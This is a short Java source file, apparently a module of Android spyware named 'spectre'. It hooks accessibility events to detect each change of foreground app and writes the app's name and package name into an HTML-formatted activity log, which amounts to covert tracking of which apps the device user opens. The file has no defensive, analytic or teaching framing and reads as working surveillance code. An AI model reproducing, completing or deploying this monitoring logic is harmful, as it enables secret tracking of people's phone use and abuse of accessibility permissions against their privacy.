package com.hygnus.spectre;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;

public class ActivityDriver {
    private static String lastActivity = "";

    private static String getAppName(String packageName) {
        PackageManager pm = Kernel.serviceContext.getPackageManager();
        try {
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return (String) pm.getApplicationLabel(ai);
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }

    public static void captureActivity(AccessibilityEvent event) {
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
        if (!packageName.equals(lastActivity)) {
            lastActivity = packageName;
            Storage.logMessage(Storage.stateWriter, "<span style=\"color:hotpink\"><strong>" +
                    getAppName(packageName) + "</strong></span><span style=\"color:PaleVioletRed\"> [" + packageName + "]</span>", true);
        }
    }
}